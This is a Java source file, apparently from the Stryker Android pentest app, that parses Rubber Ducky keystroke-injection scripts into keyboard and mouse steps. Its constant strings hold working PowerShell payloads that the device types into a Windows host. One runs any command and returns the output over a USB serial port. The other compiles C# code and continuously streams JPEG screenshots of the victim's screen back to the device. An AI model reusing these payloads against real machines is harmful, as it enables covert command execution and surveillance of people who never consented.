package com.zalexdev.stryker.hid.ducky;

import androidx.annotation.NonNull;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public final class DuckyParser {

    private static final String WINHI_PS_PREFIX =
            "$id=@(gwmi Win32_PnPEntity|?{$_.DeviceID -match 'VID_1D50.PID_601[89]'}|"
          + "%{[regex]::Match($_.Caption,'COM\\d+').Value}|?{$_})[0]; "
          + "if($id){$p=[System.IO.Ports.SerialPort]::new($id,9600);$p.Open();"
          + "try{$o=&{";
    private static final String WINHI_PS_SUFFIX =
            "}|Out-String;$o=$o -replace \"`r`n\",\" | \" -replace \"`n\",\" | \";"
          + "$p.WriteLine($o.Trim())}catch{$p.WriteLine(\"ERR: $_\")};$p.Close()}";

    private static final String START_SCREEN_SCRIPT =
            "$W=1280;$H=720;$Q=55;$I=100; "
          + "$src='using System.Drawing;using System.Drawing.Drawing2D;using System.Drawing.Imaging;"
          + "using System.IO;using System.Runtime.InteropServices;using System.Windows.Forms;"
          + "public static class H{[DllImport(\"user32.dll\")] static extern bool SetProcessDPIAware();"
          + "static H(){try{SetProcessDPIAware();}catch{}}"
          + "static ImageCodecInfo c=System.Array.Find(ImageCodecInfo.GetImageEncoders(),x=>x.MimeType==\"image/jpeg\");"
          + "public static byte[] F(int w,int h,int q){var b=Screen.PrimaryScreen.Bounds;"
          + "using(var s=new Bitmap(b.Width,b.Height))using(var g=Graphics.FromImage(s)){"
          + "g.CopyFromScreen(b.X,b.Y,0,0,b.Size);"
          + "using(var d=new Bitmap(w,h,PixelFormat.Format24bppRgb))"
          + "using(var g2=Graphics.FromImage(d))using(var a=new ImageAttributes()){"
          + "a.SetWrapMode(WrapMode.TileFlipXY);"
          + "g2.InterpolationMode=InterpolationMode.HighQualityBilinear;"
          + "g2.PixelOffsetMode=PixelOffsetMode.HighQuality;"
          + "g2.DrawImage(s,new Rectangle(0,0,w,h),0,0,b.Width,b.Height,GraphicsUnit.Pixel,a);"
          + "using(var m=new MemoryStream()){var p=new EncoderParameters(1);"
          + "p.Param[0]=new EncoderParameter(Encoder.Quality,(long)q);"
          + "d.Save(m,c,p);return m.ToArray();}}}}}'; "
          + "if(-not('H' -as [type])){Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms}; "
          + "$null=[H]::F(2,2,50); "
          + "$id=@(gwmi Win32_PnPEntity|?{$_.DeviceID -match 'VID_1D50.PID_601[89]|VID_0525.PID_A4A7' -or $_.Caption -match 'Stryker'}|"
          + "%{[regex]::Match($_.Caption,'COM\\d+').Value}|?{$_})[0]; "
          + "if(-not $id){return}; "
          + "$p=[System.IO.Ports.SerialPort]::new($id,115200,'None',8,'One'); "
          + "$p.WriteTimeout=30000; $p.WriteBufferSize=1048576; $p.Open(); "
          + "trap{if($p -and $p.IsOpen){try{$p.Close()}catch{};try{$p.Dispose()}catch{}};break}; "
          + "$m=[byte[]]@(0x53,0x54,0x52,0x4B); "
          + "$hw=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; "
          + "$hh=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; "
          + "$hwBE=[byte[]]@([byte](($hw -shr 8) -band 0xFF),[byte]($hw -band 0xFF)); "
          + "$hhBE=[byte[]]@([byte](($hh -shr 8) -band 0xFF),[byte]($hh -band 0xFF)); "
          + "while($true){$f=[H]::F($W,$H,$Q); "
          + "$l=[BitConverter]::GetBytes([uint32]$f.Length); if([BitConverter]::IsLittleEndian){[Array]::Reverse($l)}; "
          + "$t=[BitConverter]::GetBytes([int64]([DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds())); if([BitConverter]::IsLittleEndian){[Array]::Reverse($t)}; "
          + "try{$p.Write($m,0,4);$p.Write($l,0,4);$p.Write($t,0,8);$p.Write($hwBE,0,2);$p.Write($hhBE,0,2);$p.Write($f,0,$f.Length)}catch{try{$p.DiscardOutBuffer()}catch{}}; "
          + "Start-Sleep -Milliseconds $I}";

    public Program parse(@NonNull String source) throws DuckyParseException {
        String[] rawLines = source.split("\\R", -1);
        List<Step> steps = new ArrayList<>(rawLines.length);
        Map<String, String> defines = new HashMap<>();
        long defaultDelay = 0;
        long defaultCharDelay = 0;
        Step previous = null;

        int i = 0;
        while (i < rawLines.length) {
            int lineNo = i + 1;
            String raw = rawLines[i++];
            String line = raw.trim();
            if (line.isEmpty()) continue;

            String resolved = applyDefines(line, defines);
            String[] parts = splitFirstWhitespace(resolved);
            String cmd = parts[0].toUpperCase(Locale.ROOT);
            String body = parts.length > 1 ? parts[1] : "";

            switch (cmd) {
                case "REM":
                case "//": {
                    steps.add(new Step.Comment(lineNo, body));
                    continue;
                }
                case "DEFINE": {
                    String[] kv = splitFirstWhitespace(body);
                    if (kv.length < 2) throw new DuckyParseException(lineNo,
                            "DEFINE expects NAME VALUE");
                    defines.put(kv[0], kv[1]);
                    continue;
                }
                case "DEFAULTDELAY":
                case "DEFAULT_DELAY": {
                    defaultDelay = parseMillis(body, lineNo);
                    continue;
                }
                case "DEFAULTCHARDELAY":
                case "DEFAULT_CHAR_DELAY": {
                    defaultCharDelay = parseMillis(body, lineNo);
                    continue;
                }
                case "DELAY": {
                    Step.Delay d = new Step.Delay(lineNo, parseMillis(body, lineNo));
                    steps.add(d);
                    previous = d;
                    continue;
                }
                case "STRING": {
                    Step.TypeString s = new Step.TypeString(lineNo, body, false, defaultCharDelay);
                    steps.add(s);
                    previous = s;
                    continue;
                }
                case "STRINGLN": {
                    Step.TypeString s = new Step.TypeString(lineNo, body, true, defaultCharDelay);
                    steps.add(s);
                    previous = s;
                    continue;
                }
                case "STRINGDELAY":
                case "STRING_DELAY": {
                    String[] sd = splitFirstWhitespace(body);
                    if (sd.length < 2) throw new DuckyParseException(lineNo,
                            "STRINGDELAY expects <ms> <text>");
                    long per = parseMillis(sd[0], lineNo);
                    Step.TypeString s = new Step.TypeString(lineNo, sd[1], false, per);
                    steps.add(s);
                    previous = s;
                    continue;
                }
                case "REPEAT": {
                    if (body.isEmpty() || body.toUpperCase(Locale.ROOT).startsWith("END")) {
                        continue;
                    }
                    int n = parseInt(body, lineNo);
                    if (previous == null) {
                        throw new DuckyParseException(lineNo,
                                "REPEAT without a preceding step");
                    }
                    for (int r = 0; r < n; r++) {
                        steps.add(previous);
                        appendDefaultDelay(steps, defaultDelay, lineNo);
                    }
                    continue;
                }
                case "END_REPEAT":
                    continue;
                case "HOLD": {
                    Step.Hold h = parseHold(lineNo, body);
                    steps.add(h);
                    previous = h;
                    continue;
                }
                case "RELEASE":
                case "RELEASE_ALL": {
                    Step.Release r = new Step.Release(lineNo);
                    steps.add(r);
                    previous = r;
                    continue;
                }
                case "MOUSE_MOVE": {
                    int[] xy = parseTwoInts(body, lineNo);
                    Step.MouseMove m = new Step.MouseMove(lineNo, xy[0], xy[1]);
                    steps.add(m);
                    previous = m;
                    continue;
                }
                case "MOUSE_CLICK": {
                    int btn = parseMouseButton(body, lineNo);
                    Step.MouseClick mc = new Step.MouseClick(lineNo, btn);
                    steps.add(mc);
                    previous = mc;
                    continue;
                }
                case "MOUSE_SCROLL": {
                    Step.MouseScroll ms = new Step.MouseScroll(lineNo, parseInt(body, lineNo));
                    steps.add(ms);
                    previous = ms;
                    continue;
                }
                case "ATTACKMODE":
                    continue;
                case "SCREEN":
                case "VIEW": {
                    Step.OpenViewer v = new Step.OpenViewer(lineNo);
                    steps.add(v);
                    previous = v;
                    continue;
                }
                case "STARTSCREEN":
                case "STARTVIEW": {
                    long startScreenFloor = 5L;
                    long perChar    = Math.max(defaultCharDelay, startScreenFloor);
                    long intervalMs = 100L;
                    long widthPx    = 1280L;
                    long heightPx   = 720L;
                    long quality    = 55L;
                    if (!body.isEmpty()) {
                        String[] args = body.trim().split("\\s+");
                        if (args.length >= 1 && isAllDigits(args[0])) {
                            perChar = parseMillis(args[0], lineNo);
                        }
                        if (args.length >= 2 && isAllDigits(args[1])) {
                            intervalMs = parseMillis(args[1], lineNo);
                            if (intervalMs < 1)    intervalMs = 1;
                            if (intervalMs > 5000) intervalMs = 5000;
                        }
                        if (args.length >= 3 && isAllDigits(args[2])) {
                            widthPx = parseMillis(args[2], lineNo);
                            if (widthPx < 320)  widthPx = 320;
                            if (widthPx > 3840) widthPx = 3840;
                            if ((widthPx & 1L) == 1L) widthPx--;
                        }
                        if (args.length >= 4 && isAllDigits(args[3])) {
                            heightPx = parseMillis(args[3], lineNo);
                            if (heightPx < 180)  heightPx = 180;
                            if (heightPx > 2160) heightPx = 2160;
                            if ((heightPx & 1L) == 1L) heightPx--;
                        }
                        if (args.length >= 5 && isAllDigits(args[4])) {
                            quality = parseMillis(args[4], lineNo);
                            if (quality < 10) quality = 10;
                            if (quality > 95) quality = 95;
                        }
                    }
                    String snippet = START_SCREEN_SCRIPT
                            .replace("$W=1280", "$W=" + widthPx)
                            .replace("$H=720",  "$H=" + heightPx)
                            .replace("$Q=55",   "$Q=" + quality)
                            .replace("$I=100",  "$I=" + intervalMs);
                    Step.TypeString s = new Step.TypeString(
                            lineNo, snippet, true, perChar);
                    steps.add(s);
                    previous = s;
                    continue;
                }
                case "GETWINHI":
                case "CAPTURE": {
                    long timeout = body.isEmpty() ? 5000L : parseMillis(body, lineNo);
                    Step.Capture cap = new Step.Capture(lineNo, timeout);
                    steps.add(cap);
                    previous = cap;
                    continue;
                }
                case "WINHI": {
                    if (body.isEmpty()) {
                        throw new DuckyParseException(lineNo,
                                "WINHI needs a PowerShell command");
                    }
                    long timeout = 5000L;
                    String userCmd = body;
                    String[] parts2 = splitFirstWhitespace(body);
                    if (parts2.length > 1 && isAllDigits(parts2[0])) {
                        timeout = parseMillis(parts2[0], lineNo);
                        userCmd = parts2[1];
                    }
                    if (userCmd.trim().isEmpty()) {
                        throw new DuckyParseException(lineNo,
                                "WINHI needs a command after the timeout");
                    }
                    String snippet = WINHI_PS_PREFIX + userCmd + WINHI_PS_SUFFIX;
                    Step.TypeString s = new Step.TypeString(lineNo, snippet, true, defaultCharDelay);
                    steps.add(s);
                    Step.Capture cap = new Step.Capture(lineNo, timeout);
                    steps.add(cap);
                    previous = cap;
                    continue;
                }
                default: {
                    Step.Combo c = parseCombo(lineNo, resolved);
                    steps.add(c);
                    previous = c;
                }
            }

            appendDefaultDelay(steps, defaultDelay, lineNo);
        }
        return new Program(steps, defaultDelay, defaultCharDelay);
    }

    private void appendDefaultDelay(List<Step> steps, long defaultDelay, int line) {
        if (defaultDelay > 0) {
            steps.add(new Step.Delay(line, defaultDelay));
        }
    }

    private Step.Combo parseCombo(int lineNo, String line) throws DuckyParseException {
        String[] tokens = line.split("\\s+|-(?=[A-Za-z])");
        int modifier = 0;
        Integer keycode = null;
        for (String token : tokens) {
            if (token.isEmpty()) continue;
            Integer mod = NamedKeys.modifierFor(token);
            if (mod != null) {
                modifier |= mod;
                continue;
            }
            Integer named = NamedKeys.keyFor(token);
            if (named != null) {
                keycode = named;
                continue;
            }
            if (token.length() == 1) {
                int kc = singleCharKeycode(token.charAt(0));
                if (kc != 0) keycode = kc;
                else throw new DuckyParseException(lineNo,
                        "Cannot map character '" + token + "' in combo");
                continue;
            }
            throw new DuckyParseException(lineNo, "Unknown token '" + token + "'");
        }
        if (keycode == null) {
            if (modifier == 0) {
                throw new DuckyParseException(lineNo, "Combo missing a keycode");
            }
            return new Step.Combo(lineNo, modifier, 0);
        }
        return new Step.Combo(lineNo, modifier, keycode);
    }

    private Step.Hold parseHold(int lineNo, String body) throws DuckyParseException {
        if (body.isEmpty()) throw new DuckyParseException(lineNo, "HOLD requires keys");
        return new Step.Hold(lineNo, parseCombo(lineNo, body).modifier,
                parseCombo(lineNo, body).keycode);
    }

    private int parseMouseButton(String body, int line) throws DuckyParseException {
        switch (body.trim().toUpperCase(Locale.ROOT)) {
            case "":
            case "LEFT":   return com.zalexdev.stryker.hid.report.MouseReport.BTN_LEFT;
            case "RIGHT":  return com.zalexdev.stryker.hid.report.MouseReport.BTN_RIGHT;
            case "MIDDLE": return com.zalexdev.stryker.hid.report.MouseReport.BTN_MIDDLE;
            default:
                throw new DuckyParseException(line, "Unknown mouse button '" + body + "'");
        }
    }

    private long parseMillis(String body, int line) throws DuckyParseException {
        try { return Long.parseLong(body.trim()); }
        catch (NumberFormatException e) {
            throw new DuckyParseException(line, "Expected integer milliseconds, got '" + body + "'");
        }
    }

    private int parseInt(String body, int line) throws DuckyParseException {
        try { return Integer.parseInt(body.trim()); }
        catch (NumberFormatException e) {
            throw new DuckyParseException(line, "Expected integer, got '" + body + "'");
        }
    }

    private int[] parseTwoInts(String body, int line) throws DuckyParseException {
        String[] xy = body.trim().split("\\s+");
        if (xy.length < 2) throw new DuckyParseException(line, "Expected two integers");
        return new int[]{parseInt(xy[0], line), parseInt(xy[1], line)};
    }

    private String applyDefines(String line, Map<String, String> defines) {
        if (defines.isEmpty()) return line;
        String result = line;
        for (Map.Entry<String, String> e : defines.entrySet()) {
            result = result.replace(e.getKey(), e.getValue());
        }
        return result;
    }

    private static boolean isAllDigits(String s) {
        if (s == null || s.isEmpty()) return false;
        for (int i = 0; i < s.length(); i++) {
            if (!Character.isDigit(s.charAt(i))) return false;
        }
        return true;
    }

    private String[] splitFirstWhitespace(String s) {
        int idx = -1;
        for (int i = 0; i < s.length(); i++) {
            if (Character.isWhitespace(s.charAt(i))) { idx = i; break; }
        }
        if (idx < 0) return new String[]{s};
        return new String[]{s.substring(0, idx), s.substring(idx + 1).trim()};
    }

    private int singleCharKeycode(char c) {
        char lower = Character.toLowerCase(c);
        if (lower >= 'a' && lower <= 'z') return 4 + (lower - 'a');
        if (c >= '1' && c <= '9') return 30 + (c - '1');
        if (c == '0') return 39;
        return 0;
    }

    public static List<Step> rawSteps(@NonNull Program p) {
        return new ArrayList<>(p.steps);
    }
}
